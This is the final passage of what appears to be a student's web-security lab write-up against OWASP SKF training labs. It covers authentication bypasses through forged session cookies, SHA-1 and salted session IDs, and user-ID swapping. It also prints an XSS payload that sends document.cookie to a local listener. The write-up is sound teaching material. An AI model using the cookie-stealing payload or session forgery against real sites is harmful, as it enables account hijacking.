+</center><h2 id="Authentication-bypass--easy-" data-id="Authentication-bypass--easy-"><a class="anchor hidden-xs" href="#Authentication-bypass--easy-" title="Authentication-bypass--easy-"><span class="octicon octicon-link"></span></a><span>Authentication bypass ( easy )</span></h2><p><span>The login page, which after log in shows the API key - </span><strong><span>Your API key: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8</span></strong><span>. it also have cookie session secret in code (Figure 84).</span></p><center>
+<p><img src="https://i.imgur.com/rOg3pJW.png" alt="" loading="lazy"><br>
+<span>Figure 84 - Cookie session</span></p>
+</center><p><span>I can bypass authentication using this info. So I generate my own cookie using exposed an secret (Figure 85).</span></p><center>
+<p><img src="https://i.imgur.com/fygUQRu.png" alt="" loading="lazy"><br>
+<span>Figure 85 - generated session cookie</span></p>
+</center><p><span>As result I authenticate as user with userId = 2 and API key = </span><strong><span>cbfdac6008f9cab4083784cbd1874f76618d2a97</span></strong><span>.</span></p><p><span>It can be prevented if the session cookie was not exposed and ensuring that user session IDs and cookies are encrypted.</span></p><h2 id="Authentication-bypass" data-id="Authentication-bypass"><a class="anchor hidden-xs" href="#Authentication-bypass" title="Authentication-bypass"><span class="octicon octicon-link"></span></a><span>Authentication bypass</span></h2><p><span>This time there is a web page with a sign-in/sign-up function. I need to log in as an admin. let’s start with registration. There is nothing that I can use in the registration process (Figure 86).</span></p><center>
+<p><img src="https://i.imgur.com/ZEckM5H.png" alt="" loading="lazy"><br>
+<span>Figure 86 - Registration</span></p>
+</center><p><span>Then i move on to log in and here I found the sessionID value - </span><strong><span>12dea96fec20593566ab75692c9949596833adc9</span></strong><span>. I google it and found that this is SHA-1 from username. Let’s try to create SHA-1 for admin - </span><strong><span>d033e22ae348aeb5660fc2140aec35850c4da997</span></strong><span>. Then I change the value of sessionId. As a result, when I proceed to the authenticated section I was logged in as an admin (Figure 87).</span></p><center>
+<p><img src="https://i.imgur.com/qVvNfr6.png" alt="" loading="lazy"><br>
+<span>Figure 87 - logged in as admin</span></p>
+</center><p><span>The problem here is the usage of a weak hash.</span></p><h2 id="Authentication-bypass--harder-" data-id="Authentication-bypass--harder-"><a class="anchor hidden-xs" href="#Authentication-bypass--harder-" title="Authentication-bypass--harder-"><span class="octicon octicon-link"></span></a><span>Authentication bypass ( harder )</span></h2><p><span>The same web page. Registration again does not contain any info. But login contains info about sessionId (Figure 88).</span></p><center>
+<p><img src="https://i.imgur.com/5FKRaIE.png" alt="" loading="lazy"><br>
+<span>Figure 88 - Value of sessionId</span></p>
+</center><p><span>This is SHA-1 but this time there is no reserve value. It may use salt for it. Also, it has one more page </span><strong><span>/about</span></strong><span>, that contains some text. I extract words from it into a dictionary that I will use to find the needed hash value(us + word). Word 120 (SKFowaspLabs) gives me the intended result (Figure 89).</span></p><center>
+<p><img src="https://i.imgur.com/BjRxZBQ.png" alt="" loading="lazy"><br>
+<span>Figure 89 - word 120 (SKFowaspLabs) is salt</span></p>
+</center><p><span>So sessionId for admin is equal to </span><strong><span>e030f7ae578fa939191ee5f3a51689775f351daf</span></strong><span>. i change the value and logged in as admin (Figure 90).</span></p><center>
+<p><img src="https://i.imgur.com/v22rsBE.png" alt="" loading="lazy"><br>
+<span>Figure 90 - Logged in as admin</span></p>
+</center><p><span>The problem - salt is the word that is used in web applications.</span></p><h2 id="Authentication-bypass--hard-" data-id="Authentication-bypass--hard-"><a class="anchor hidden-xs" href="#Authentication-bypass--hard-" title="Authentication-bypass--hard-"><span class="octicon octicon-link"></span></a><span>Authentication bypass ( hard )</span></h2><p><span>It starts with creating a user form. Figure 91 shows a POST request to create a user.</span></p><center>
+<p><img src="https://i.imgur.com/3u1xSCN.png" alt="" loading="lazy"><br>
+<span>Figure 91 - POST request</span></p>
+</center><p><span>Then I can access private space using a GET request (Figure 92).</span></p><center>
+<p><img src="https://i.imgur.com/xBH5uuw.png" alt="" loading="lazy"><br>
+<span>Figure 92 - GET request</span></p>
+</center><p><span>It seems it uses userId to do this. So let’s just change user03 to user01 (Figure 93) and user02 (Figure 94).</span></p><center>
+<p><img src="https://i.imgur.com/KM7L1gV.png" alt="" loading="lazy"><br>
+<span>Figure 93 - bob</span></p>
+<p><img src="https://i.imgur.com/NAQQavO.png" alt="" loading="lazy"><br>
+<span>Figure 94 - admin</span></p>
+</center><p><span>I don’t know why this is hard. It is just a weak mechanism (misconfiguration) for managing sessions.</span></p><h2 id="Authentication-bypass1" data-id="Authentication-bypass"><a class="anchor hidden-xs" href="#Authentication-bypass1" title="Authentication-bypass1"><span class="octicon octicon-link"></span></a><span>Authentication bypass</span></h2><p><a href="https://www.youtube.com/watch?v=9SrzI4tRcbs" target="_blank" rel="noopener"><span>Никитааа, это я уже видел!</span></a></p><h2 id="HttpOnly-session-hijacking" data-id="HttpOnly-session-hijacking"><a class="anchor hidden-xs" href="#HttpOnly-session-hijacking" title="HttpOnly-session-hijacking"><span class="octicon octicon-link"></span></a><span>HttpOnly (session hijacking)</span></h2><p><span>Back to XSS. I can execute the XSS with session cookie value using the </span><strong>&lt;script&gt;<span>alert(document.cookie)</span>&lt;/script&gt;</strong><span> (Figure 95).</span></p><center>
+<p><img src="https://i.imgur.com/6BD36k7.png" alt="" loading="lazy"><br>
+<span>Figure 95 - session cookie</span></p>
+</center><p><span>HttpOnly is a tag added to a browser cookie that prevents client-side scripts from accessing data to prevent malicious cross-site scripting. I can create an external server that will be capable to steal session cookies. And then send the cookie from server to it using the command </span><strong>&lt;script&gt;<span>new Image().src = “</span><a href="http://localhost:1337/?stolen_cookie=%E2%80%9D" target="_blank" rel="noopener"><span>http://localhost:1337/?stolen_cookie=”</span></a><span> + document.cookie</span>&lt;/script&gt;</strong><span> (Figure 96).</span></p><center>
+<p><img src="https://i.imgur.com/fWtxFYK.png" alt="" loading="lazy"><br>
+<span>Figure 96 - Stolen cookies</span></p>
+</center><p><span>To avoid this type of situation need to set HttpOnly attribute.</span></p><h2 id="References" data-id="References"><a class="anchor hidden-xs" href="#References" title="References"><span class="octicon octicon-link"></span></a><span>References</span></h2><ol>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/express-xss/" target="_blank" rel="noopener"><span>XSS prevention for Express</span></a></li>
+<li><a href="https://github.com/braintree/sanitize-url" target="_blank" rel="noopener"><span>SanitizeUrl</span></a></li>
+<li><a href="https://habr.com/ru/company/nix/blog/271575/" target="_blank" rel="noopener"><span>Content Security Policy</span></a></li>
+<li><a href="https://beaglesecurity.com/blog/vulnerability/insecure-file-upload.html" target="_blank" rel="noopener"><span>Insecure File Upload</span></a></li>
+<li><a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener"><span>CyberChef</span></a></li>
+<li><a href="https://www.geeksforgeeks.org/insecure-direct-object-reference-idor-vulnerability/" target="_blank" rel="noopener"><span>Insecure Direct Object Reference (IDOR) Vulnerability</span></a></li>
+<li><a href="https://cybriant.com/what-is-a-right-to-left-override-attack/" target="_blank" rel="noopener"><span>What is a Right-to-Left Override Attack?</span></a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-40.txt" target="_blank" rel="noopener"><span>rockyou</span></a></li>
+</ol></div>
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-right dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+                <div class="toc"><ul class="nav">
+<li class=""><a href="#AS-Lab-2---Web-Security" title="AS Lab 2 - Web Security">AS Lab 2 - Web Security</a><ul class="nav">
+<li><a href="#Cross-site-scripting" title="Cross-site scripting">Cross-site scripting</a></li>
+<li><a href="#Cross-site-scripting-attribute" title="Cross site scripting (attribute)">Cross site scripting (attribute)</a></li>
+<li><a href="#Cross-site-scripting-href" title="Cross site scripting (href)">Cross site scripting (href)</a></li>
+<li><a href="#CSS-Injection" title="CSS Injection">CSS Injection</a></li>
+<li><a href="#XSSI" title="XSSI">XSSI</a></li>
+<li><a href="#Cross-site-request-forgery" title="Cross site request forgery">Cross site request forgery</a></li>
+<li><a href="#Cross-site-request-forgery-same-site" title="Cross site request forgery (same site)">Cross site request forgery (same site)</a></li>
+<li><a href="#Cross-site-request-forgery-weak" title="Cross site request forgery weak">Cross site request forgery weak</a></li>
+<li><a href="#Clickjacking" title="Clickjacking">Clickjacking</a></li>
+<li><a href="#Content-security-policy" title="Content security policy">Content security policy</a></li>
+<li><a href="#CORS-exploitation" title="CORS exploitation">CORS exploitation</a></li>
+<li><a href="#Path-traversal-LFI" title="Path traversal (LFI)">Path traversal (LFI)</a></li>
+<li><a href="#Local-file-inclusion-harder" title="Local file inclusion (harder)">Local file inclusion (harder)</a></li>
+<li><a href="#Local-file-inclusion-hard" title="Local file inclusion (hard)">Local file inclusion (hard)</a></li>
+<li><a href="#Open-redirect" title="Open redirect">Open redirect</a></li>
+<li><a href="#Open-redirect--hard-" title="Open redirect ( hard )">Open redirect ( hard )</a></li>
+<li><a href="#Insecure-File-Upload" title="Insecure File Upload">Insecure File Upload</a></li>
+<li><a href="#Remote-file-inclusion" title="Remote file inclusion">Remote file inclusion</a></li>
+<li><a href="#SQLI-union-select" title="SQLI (union select)">SQLI (union select)</a></li>
+<li><a href="#SQLI---like" title="SQLI - like">SQLI - like</a></li>
+<li><a href="#SQLI---blind" title="SQLI - blind">SQLI - blind</a></li>
+<li><a href="#Insecure-direct-object-reference" title="Insecure direct object reference">Insecure direct object reference</a></li>
+<li><a href="#Right-to-left-override-attack" title="Right to left override attack">Right to left override attack</a></li>
+<li><a href="#Rate-limiting" title="Rate-limiting">Rate-limiting</a></li>
+<li><a href="#Regex-DDOS" title="Regex DDOS">Regex DDOS</a></li>
+<li><a href="#Command-injection" title="Command injection">Command injection</a></li>
+<li><a href="#Command-injection--easy-" title="Command injection ( easy )">Command injection ( easy )</a></li>
+<li><a href="#Command-injection--harder-" title="Command injection ( harder )">Command injection ( harder )</a></li>
+<li><a href="#Information-disclosure-1" title="Information disclosure 1">Information disclosure 1</a></li>
+<li><a href="#Information-disclosure-2" title="Information disclosure 2">Information disclosure 2</a></li>
+<li><a href="#Authentication-bypass--easy-" title="Authentication bypass ( easy )">Authentication bypass ( easy )</a></li>
+<li><a href="#Authentication-bypass" title="Authentication bypass">Authentication bypass</a></li>
+<li><a href="#Authentication-bypass--harder-" title="Authentication bypass ( harder )">Authentication bypass ( harder )</a></li>
+<li><a href="#Authentication-bypass--hard-" title="Authentication bypass ( hard )">Authentication bypass ( hard )</a></li>
+<li><a href="#Authentication-bypass1" title="Authentication bypass">Authentication bypass</a></li>
+<li><a href="#HttpOnly-session-hijacking" title="HttpOnly (session hijacking)">HttpOnly (session hijacking)</a></li>
+<li class=""><a href="#References" title="References">References</a></li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+            </ul>
+        </div>
+    </div>
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;" null null>
+        <div class="toc"><ul class="nav">
+<li class=""><a href="#AS-Lab-2---Web-Security" title="AS Lab 2 - Web Security">AS Lab 2 - Web Security</a><ul class="nav">
+<li><a href="#Cross-site-scripting" title="Cross-site scripting">Cross-site scripting</a></li>
+<li><a href="#Cross-site-scripting-attribute" title="Cross site scripting (attribute)">Cross site scripting (attribute)</a></li>
+<li><a href="#Cross-site-scripting-href" title="Cross site scripting (href)">Cross site scripting (href)</a></li>
+<li><a href="#CSS-Injection" title="CSS Injection">CSS Injection</a></li>
+<li><a href="#XSSI" title="XSSI">XSSI</a></li>
+<li><a href="#Cross-site-request-forgery" title="Cross site request forgery">Cross site request forgery</a></li>
+<li><a href="#Cross-site-request-forgery-same-site" title="Cross site request forgery (same site)">Cross site request forgery (same site)</a></li>
+<li><a href="#Cross-site-request-forgery-weak" title="Cross site request forgery weak">Cross site request forgery weak</a></li>
+<li><a href="#Clickjacking" title="Clickjacking">Clickjacking</a></li>
+<li><a href="#Content-security-policy" title="Content security policy">Content security policy</a></li>
+<li><a href="#CORS-exploitation" title="CORS exploitation">CORS exploitation</a></li>
+<li><a href="#Path-traversal-LFI" title="Path traversal (LFI)">Path traversal (LFI)</a></li>
+<li><a href="#Local-file-inclusion-harder" title="Local file inclusion (harder)">Local file inclusion (harder)</a></li>
+<li><a href="#Local-file-inclusion-hard" title="Local file inclusion (hard)">Local file inclusion (hard)</a></li>
+<li><a href="#Open-redirect" title="Open redirect">Open redirect</a></li>
+<li><a href="#Open-redirect--hard-" title="Open redirect ( hard )">Open redirect ( hard )</a></li>
+<li><a href="#Insecure-File-Upload" title="Insecure File Upload">Insecure File Upload</a></li>
+<li><a href="#Remote-file-inclusion" title="Remote file inclusion">Remote file inclusion</a></li>
+<li><a href="#SQLI-union-select" title="SQLI (union select)">SQLI (union select)</a></li>
+<li><a href="#SQLI---like" title="SQLI - like">SQLI - like</a></li>
+<li><a href="#SQLI---blind" title="SQLI - blind">SQLI - blind</a></li>
+<li><a href="#Insecure-direct-object-reference" title="Insecure direct object reference">Insecure direct object reference</a></li>
+<li><a href="#Right-to-left-override-attack" title="Right to left override attack">Right to left override attack</a></li>
+<li><a href="#Rate-limiting" title="Rate-limiting">Rate-limiting</a></li>
+<li><a href="#Regex-DDOS" title="Regex DDOS">Regex DDOS</a></li>
+<li><a href="#Command-injection" title="Command injection">Command injection</a></li>
+<li><a href="#Command-injection--easy-" title="Command injection ( easy )">Command injection ( easy )</a></li>
+<li><a href="#Command-injection--harder-" title="Command injection ( harder )">Command injection ( harder )</a></li>
+<li><a href="#Information-disclosure-1" title="Information disclosure 1">Information disclosure 1</a></li>
+<li><a href="#Information-disclosure-2" title="Information disclosure 2">Information disclosure 2</a></li>
+<li><a href="#Authentication-bypass--easy-" title="Authentication bypass ( easy )">Authentication bypass ( easy )</a></li>
+<li><a href="#Authentication-bypass" title="Authentication bypass">Authentication bypass</a></li>
+<li><a href="#Authentication-bypass--harder-" title="Authentication bypass ( harder )">Authentication bypass ( harder )</a></li>
+<li><a href="#Authentication-bypass--hard-" title="Authentication bypass ( hard )">Authentication bypass ( hard )</a></li>
+<li><a href="#Authentication-bypass1" title="Authentication bypass">Authentication bypass</a></li>
+<li><a href="#HttpOnly-session-hijacking" title="HttpOnly (session hijacking)">HttpOnly (session hijacking)</a></li>
+<li class=""><a href="#References" title="References">References</a></li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
+    <script>
+        var markdown = $(".markdown-body");
+        //smooth all hash trigger scrolling
+        function smoothHashScroll() {
+            var hashElements = $("a[href^='#']").toArray();
+            for (var i = 0; i < hashElements.length; i++) {
+                var element = hashElements[i];
+                var $element = $(element);
+                var hash = element.hash;
+                if (hash) {
+                    $element.on('click', function (e) {
+                        // store hash
+                        var hash = this.hash;
+                        if ($(hash).length <= 0) return;
+                        // prevent default anchor click behavior
+                        e.preventDefault();
+                        // animate
+                        $('body, html').stop(true, true).animate({
+                            scrollTop: $(hash).offset().top
+                        }, 100, "linear", function () {
+                            // when done, add hash to url
+                            // (default click behaviour)
+                            window.location.hash = hash;
+                        });
+                    });
+                }
+            }
+        }
+
+        smoothHashScroll();
+        var toc = $('.ui-toc');
+        var tocAffix = $('.ui-affix-toc');
+        var tocDropdown = $('.ui-toc-dropdown');
+        //toc
+        tocDropdown.click(function (e) {
+            e.stopPropagation();
+        });
+
+        var enoughForAffixToc = true;
+
+        function generateScrollspy() {
+            $(document.body).scrollspy({
+                target: ''
+            });
+            $(document.body).scrollspy('refresh');
+            if (enoughForAffixToc) {
+                toc.hide();
+                tocAffix.show();
+            } else {
+                tocAffix.hide();
+                toc.show();
+            }
+            $(document.body).scroll();
+        }
+
+        function windowResize() {
+            //toc right
+            var paddingRight = parseFloat(markdown.css('padding-right'));
+            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
+            toc.css('right', right + 'px');
+            //affix toc left
+            var newbool;
+            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
+            //for ipad or wider device
+            if (rightMargin >= 133) {
+                newbool = true;
+                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
+                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
+                tocAffix.css('left', left + 'px');
+            } else {
+                newbool = false;
+            }
+            if (newbool != enoughForAffixToc) {
+                enoughForAffixToc = newbool;
+                generateScrollspy();
+            }
+        }
+        $(window).resize(function () {
+            windowResize();
+        });
+        $(document).ready(function () {
+            windowResize();
+            generateScrollspy();
+        });
+
+        //remove hash
+        function removeHash() {
+            window.location.hash = '';
+        }
+
+        var backtotop = $('.back-to-top');
+        var gotobottom = $('.go-to-bottom');
+
+        backtotop.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToTop)
+                scrollToTop();
+            removeHash();
+        });
+        gotobottom.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToBottom)
+                scrollToBottom();
+            removeHash();
+        });
+
+        var toggle = $('.expand-toggle');
+        var tocExpand = false;
+
+        checkExpandToggle();
+        toggle.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            tocExpand = !tocExpand;
+            checkExpandToggle();
+        })
+
+        function checkExpandToggle () {
+            var toc = $('.ui-toc-dropdown .toc');
+            var toggle = $('.expand-toggle');
+            if (!tocExpand) {
+                toc.removeClass('expand');
+                toggle.text('Expand all');
+            } else {
+                toc.addClass('expand');
+                toggle.text('Collapse all');
+            }
+        }
+
+        function scrollToTop() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: 0
+            }, 100, "linear");
+        }
+
+        function scrollToBottom() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: $(document.body)[0].scrollHeight
+            }, 100, "linear");
+        }
+    </script>
+</body>
+
+</html>
